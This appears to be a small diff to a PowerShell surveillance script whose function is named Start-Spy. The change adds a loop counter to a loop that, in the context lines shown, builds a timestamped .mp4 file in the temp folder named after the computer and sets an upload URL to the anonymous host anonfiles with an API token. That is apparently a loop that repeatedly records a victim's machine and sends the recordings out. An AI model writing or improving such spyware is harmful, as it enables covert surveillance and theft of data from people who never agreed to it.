@@ -56,9 +56,10 @@ function Start-Spy{
       [ValidateNotNullOrEmpty()]
       [int]$Delay = 0
     );
-  
-    while($count -ne $TimesRun){
-  
+
+    $count = 0;
+    
+    while($count -ne $TimesRun){  
       $time = Get-Date -Format "ddMMyyyyHHmm";
       $path = "$env:temp\$env:computername-$time.mp4";
       $url="https://api.anonfiles.com/upload?token=$Anontoken";
